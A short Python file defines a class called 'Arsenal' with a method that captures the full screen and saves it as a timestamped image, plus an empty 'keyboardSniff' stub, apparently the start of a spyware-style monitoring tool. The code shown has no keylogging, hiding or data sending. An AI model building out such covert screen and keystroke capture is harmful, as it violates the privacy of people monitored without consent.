import datetime
from PIL import ImageGrab


class Arsenal:
	def __init__(self):
		self.pid = None


	def takeShot(self):
		image = ImageGrab.grab(bbox = None)
		time = datetime.datetime.now()
		time = f'{time.date()} {time.time().strftime("%H.%M")}'
		image.save(f'data/{time}.png')


	def keyboardSniff(self):
		...